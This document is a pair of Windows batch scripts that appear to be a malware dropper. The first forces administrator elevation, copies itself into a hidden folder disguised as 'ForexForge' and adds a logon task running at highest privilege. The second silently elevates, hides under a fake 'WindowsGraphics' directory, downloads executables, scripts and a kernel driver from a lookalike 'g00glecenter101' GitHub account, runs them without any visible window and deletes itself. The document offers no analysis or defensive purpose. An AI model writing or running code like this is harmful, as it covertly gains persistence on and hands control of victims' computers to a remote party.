@echo off
:: 1. ELEVATION CHECK (UAC)
:: Checks if the script is running as Admin. If not, it re-launches itself asking for UAC.
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:: 2. CLONE & HIDE
:: Creates the directory if it doesn't exist and copies the script there.
set "targetDir=%AppData%\Local\ForexForge"
set "targetFile=%targetDir%\EngineHost.bat"

if not exist "%targetDir%" mkdir "%targetDir%"
copy /Y "%~f0" "%targetFile%" >nul

:: Hides the folder and the file from normal view
attrib +h +s "%targetDir%"
attrib +h +s "%targetFile%"

:: 3. CREATE TASK SCHEDULE (REBOOT PERSISTENCE)
:: Creates a task named 'ForexForgeSync' that runs the hidden copy at logon.
:: /DELAY 0001:00 adds the 1-minute delay you asked for.
:: /RL HIGHEST ensures it runs as Admin WITHOUT asking for UAC again.
schtasks /create /tn "ForexForgeSync" /tr "'%targetFile%'" /sc onlogon /delay 0001:00 /rl highest /f >nul 2>&1


@echo off
setlocal

:: ============================================================
:: 1. UAC ELEVATION & AUTO-HIDE
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
    :: The '0' at the end of the next line tells Windows to run the window HIDDEN
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\admin.vbs"
    wscript "%temp%\admin.vbs"
    exit /b
)
if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"

:: ============================================================
:: 2. DIRECTORY SETUP (Now running hidden)
:: ============================================================
set "workDir=%AppData%\Local\WindowsGraphics\"
if not exist "%workDir%" mkdir "%workDir%" >nul 2>&1
cd /d "%workDir%"
if not exist "driver" mkdir "driver" >nul 2>&1

:: Security Protocol Fix
set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile"

:: ============================================================
:: 3. DOWNLOADS
:: ============================================================
:: All 'echo' commands removed so no text is generated

powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs', 'launcher.vbs')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat', 'boom.bat')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe', 'sigurd.exe')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml', 'Config.toml')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/ghost_launcher.vbs', 'launcher.vbs')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys', 'driver\k7RKScan.sys')"

:: ============================================================
:: 4. THE SILENT HANDOFF
:: ============================================================
if exist "launcher.vbs" (
    start "" "wscript.exe" "launcher.vbs"
)

:: Self-delete
(goto) 2>nul & del "%~f0"
exit
